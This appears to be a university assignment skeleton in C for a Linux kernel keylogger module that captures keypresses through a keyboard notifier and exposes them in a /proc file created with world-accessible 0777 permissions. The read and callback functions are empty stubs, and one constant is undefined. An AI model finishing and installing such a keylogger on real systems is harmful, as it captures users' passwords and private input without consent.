// A Linux kernel module keylogger using the proc filesystem
// COMP 3/4721

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/proc_fs.h>
#include <linux/version.h>
#include <linux/uaccess.h>

#define BUF_LEN 16384

MODULE_LICENSE("GPL");
MODULE_AUTHOR("COMP3721");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("Key logger kernel module");


/* Function called when someone reads our proc file */
static ssize_t klogger_read(struct file *filp,
		char *buffer,
		size_t len,
		loff_t *ppos);

/* Function called when a keypress event occurs */
static int klogger_cb(struct notifier_block *nblock,
		unsigned long code,
		void *_param);


/* A buffer to record keystrokes - 16384 bytes max */
static char keys_buffer[BUF_LEN];

/* A variable to record number of bytes used in buffer */
static size_t buff_filled_size;

/* Map of key codes to strings
 *
 * Keymap references:
 * https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
 * http://www.quadibloc.com/comp/scan.htm
 * For each keycode, there are 2 entries: first one is when
 * SHIFT is not down, and the second one is otherwise
 */
static const char *keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
	{"_PAUSE_", "_PAUSE_"},                                         // 119
};


#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
static struct proc_ops keys_fops = {
	.proc_read = klogger_read,
};
#else
static struct file_operations keys_fops = {
    .owner = THIS_MODULE,
    .read = klogger_read,
};
#endif

static struct notifier_block klogger_blk = {
	.notifier_call = klogger_cb,
};

/** 
 * Function called when someone reads our proc file 
 * See assignment description
 * 
 * @filp: file pointer (ignore)
 * @buffer: user space buffer to copy data into
 * @len: number of bytes of data requested
 * @offset: data read offset
 *
 * Returns number of bytes copied to @buffer, or negative 
 *  error code
 */
static ssize_t klogger_read(struct file *filp,
			 char *buffer,
			 size_t len,
			 loff_t *offset)
{

    
}

/**
 * Convert keycode to readable string and save in buffer
 *
 * @keycode: keycode generated by the kernel on keypress
 * @shift_mask: Shift key pressed or not
 * @buf: buffer to store readable string
 */
void keycode_to_string(int keycode, bool is_shift_pressed, char *buf)
{
	if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
		const char *us_key = (is_shift_pressed)
		? keymap[keycode][1]
		: keymap[keycode][0];

		snprintf(buf, CHUNK_LEN, "%s", us_key);
	}		
}

/**
 * Function called when a keypress event occurs
 * See assignment description
 *
 * @nblock: notifier block (ignore)
 * @code: event code (must be KBD_KEYCODE for us)
 * @_param: a keyboard_notifier_param structure with details of the event
 * 
 * Returns NOTIFY_OK
 */
int klogger_cb(struct notifier_block *nblock,
		  unsigned long code,
		  void *_param)
{
	struct keyboard_notifier_param *param = _param;
	// useful variables in keyboard_notifier_param structure
	// param->down is 1 for a key press event, 0 for a key release
    // param->shift is the current SHIFT key modifier state
    // param->value is the keycode


	return NOTIFY_OK;
}

/**
 * Module entry point
 *
 * Creates proc file
 * Registers the keyboard callback
 */
static int __init klogger_init(void)
{
    struct proc_dir_entry *entry;
    entry=proc_create("klogger",0777,NULL,&keys_fops);

	// add to the list of console keyboard event
	// notifiers so the callback klogger_cb is called
	// when an event occurs
	register_keyboard_notifier(&klogger_blk);
	return 0;
}

/**
 * Module exit function
 *
 * Unregisters the keyboard callback
 * Cleans up the proc file
 */
static void __exit klogger_exit(void)
{
	unregister_keyboard_notifier(&klogger_blk);
    remove_proc_entry("klogger", NULL);
}

module_init(klogger_init);
module_exit(klogger_exit);


